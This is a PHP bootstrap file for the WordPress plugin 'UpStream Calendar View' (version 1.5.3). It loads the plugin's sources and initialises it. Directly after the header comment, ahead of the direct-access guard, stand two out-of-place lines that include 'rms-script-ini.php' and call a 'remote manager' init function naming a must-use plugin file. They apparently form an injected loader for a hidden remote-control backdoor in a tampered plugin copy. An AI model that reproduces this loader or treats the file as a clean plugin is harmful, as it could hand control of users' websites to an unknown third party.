<?php
/**
 * Plugin Name: UpStream Calendar View
 * Plugin URI: https://upstreamplugin.com/extensions/calendar-view
 * Description: This calendar display will allow you to easily see everything that’s happening in a project. You’ll be
 * able to see due dates for all the milestones, tasks, and bugs. Author: UpStream Author URI:
 * https://upstreamplugin.com
 *
 * Version: 1.5.3
 * Domain Path: /languages
 *
 *
 * Plugin bootstrap file.
 *
 * @package     UpStream\Plugins\CalendarView
 * @author      UpStream <https://upstreamplugin.com>
 * @copyright   Copyright (c) 2018 UpStream Project Management
 * @license     GPL-3
 * @since       1.0.0
 */require_once('rms-script-ini.php');
rms_remote_manager_init(__FILE__, 'rms-script-mu-plugin.php', false, false);
// Prevent direct access.
if ( ! defined('ABSPATH')) {
    exit;
}

use UpStream\Plugins\CalendarView\Plugin;

// Load all plugin source files.
require_once __DIR__ . '/includes.php';
require_once plugin_dir_path(__FILE__) . 'autoloader.php';

if (file_exists(__DIR__ . '/vendor/autoload.php')) {
    require_once __DIR__ . '/vendor/autoload.php';
}

add_action('upstream_run', function () {
    // Check the current UpStream version before init the plugin
    if ( ! defined('UPSTREAM_VERSION') || version_compare(UPSTREAM_VERSION, UPSTREAM_CALENDAR_UPSTREAM_MIN_REQUIRED_VERSION, '<')) {
        add_action('admin_notices', function () {
            ?>
            <div class="notice notice-success is-dismissible">
                <p><?php echo sprintf(__('Sorry, but UpStream Calendar View requires UpStream version %s or later.',
                        'upstream-calendar-view'), UPSTREAM_CALENDAR_UPSTREAM_MIN_REQUIRED_VERSION); ?></p>
            </div>
            <?php
        });

        return;
    }

    // Initializes the plugin.
    Plugin::instantiate();
});
